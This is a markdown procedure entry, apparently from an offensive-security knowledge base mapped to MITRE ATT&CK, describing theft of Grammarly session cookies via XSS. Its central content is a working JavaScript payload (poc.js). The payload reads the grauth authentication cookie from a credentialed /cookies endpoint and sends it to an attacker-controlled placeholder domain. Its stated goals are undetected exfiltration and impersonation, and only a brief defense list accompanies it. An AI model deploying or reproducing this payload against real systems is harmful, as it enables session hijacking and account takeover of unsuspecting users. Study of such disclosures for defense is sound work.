---
tags:
  - cookie-theft
  - exfiltration
  - xmlhttprequest
type: procedure
tools:
  - '[[tools/XMLHttpRequest-for-Credentialed-Requests]]'
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
techniques:
  - '[[Steal Web Session Cookie]]'
  - '[[JavaScript]]'
sub_techniques: []
id: e58d996d-d359-4000-b0e8-9276bc727f2e
created_at: '2025-12-14T17:33:34.372Z'
updated_at: '2025-12-14T17:33:34.372Z'
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Steal Web Session Cookie]]'
  - '[[JavaScript]]'
---
# Inject-Script-to-Steal-Session-Cookies-via-XSS

## Summary

The injected poc.js script runs in the victim's browser, using XMLHttpRequest to query the /cookies endpoint for sensitive values like grauth, then exfiltrates them to the attacker's server, bypassing HttpOnly protections indirectly.

## Description

Due to the same-origin policy bypass via the unrestricted endpoint, the script can read HttpOnly cookies by treating them as queryable resources. This enables collection of authentication tokens for account takeover.

## Requirements

1. XSS payload executed on Grammarly domain
2. Victim's session active (grauth cookie present)
3. Attacker server to receive exfiltrated data

## Defense

Defensive measures and detection strategies:

- Restrict /cookies endpoint to same-origin only with CORS headers
- Implement rate-limiting on cookie queries
- Monitor for anomalous exfiltration requests from Grammarly domains

## Objectives

1. Retrieve grauth and other session cookies
2. Exfiltrate without detection
3. Enable subsequent impersonation

## Instructions

### Step 1: Create poc.js

**Context**: Script to steal and send cookies.

Content of poc.js:
```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://gnar.grammarly.com/cookies?name=grauth', true);
xhr.withCredentials = true;
xhr.onload = function() {
  var exfil = new XMLHttpRequest();
  exfil.open('GET', 'https://<YOUR_DOMAIN_NAME>/' + this.responseText, true);
  exfil.send();
};
xhr.send();
```

> Host on attacker's HTTPS domain.

### Step 2: Execution Trigger

**Context**: Loaded via XSS; verify by checking attacker logs.

Expected output: GET request to /grauth_value on attacker server.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Steal Web Session Cookie]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/XMLHttpRequest-for-Credentialed-Requests]]

## Tags

- [[cookie-theft]]
- [[Exfiltration]]
